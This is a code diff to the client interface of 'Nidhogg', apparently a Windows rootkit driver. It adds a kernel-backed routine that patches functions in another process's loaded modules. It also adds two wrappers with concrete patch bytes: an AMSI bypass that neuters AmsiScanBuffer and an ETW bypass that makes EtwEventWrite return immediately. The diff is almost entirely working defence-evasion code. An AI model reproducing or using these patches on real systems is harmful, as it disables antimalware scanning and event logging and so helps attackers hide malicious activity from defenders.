@@ -1,5 +1,6 @@
-#include <windows.h>
+#include <Windows.h>
 #include <vector>
+#include <string>
 #include <sddl.h>
 #pragma comment(lib, "advapi32.lib")
 
@@ -20,6 +21,8 @@
 #define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *********************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -28,7 +31,10 @@
 #define NIDHOGG_GENERAL_ERROR 1
 #define NIDHOGG_ERROR_CONNECT_DRIVER 2
 #define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3
+#define NIDHOGG_INVALID_COMMAND 4
+#define NIDHOGG_INVALID_OPTION 5
 
+#define MAX_PATCHED_MODULES 256
 #define MAX_PIDS 256
 #define MAX_FILES 256
 
@@ -52,6 +58,14 @@
 // *********************************************************************************************************
 
 // ** General Structures ***************************************************************************************
+struct PatchedModule {
+    ULONG Pid;
+    PVOID Patch;
+    ULONG PatchLength;
+    CHAR* FunctionName;
+    WCHAR* ModuleName;
+};
+
 struct ProcessesList {
     int PidsCount;
     ULONG Pids[MAX_PIDS];
@@ -869,4 +883,46 @@ std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistry
 
     CloseHandle(hFile);
     return { values, valuesKeys };
+}
+
+int NidhoggPatchModule(DWORD pid, wchar_t* moduleName, char* functionName, std::vector<byte> patch) {
+    HANDLE hFile;
+    DWORD returned;
+    PatchedModule patchedModule{};
+    
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    patchedModule.Pid = pid;
+    patchedModule.PatchLength = patch.size();
+    patchedModule.ModuleName = moduleName;
+    patchedModule.FunctionName = functionName;
+    patchedModule.Patch = patch.data();
+
+    if (patchedModule.ModuleName == nullptr || patchedModule.FunctionName == nullptr || patchedModule.Patch == nullptr) {
+        CloseHandle(hFile);
+        return NIDHOGG_GENERAL_ERROR;
+    }
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PATCH_MODULE,
+        &patchedModule, sizeof(patchedModule),
+        nullptr, 0, &returned, nullptr)) {
+        CloseHandle(hFile);
+        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
+    CloseHandle(hFile);
+    return NIDHOGG_SUCCESS;
+}
+
+int NidhoggAmsiBypass(DWORD pid) {
+    std::vector<byte> patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    return NidhoggPatchModule(pid, (wchar_t*)LR"(C:\Windows\System32\Amsi.dll)", (char*)"AmsiScanBuffer", patch);
+}
+
+int NidhoggETWBypass(DWORD pid) {
+    std::vector<byte> patch = { 0xC3 };
+    return NidhoggPatchModule(pid, (wchar_t*)LR"(C:\Windows\System32\Ntdll.dll)", (char*)"EtwEventWrite", patch); 
 }
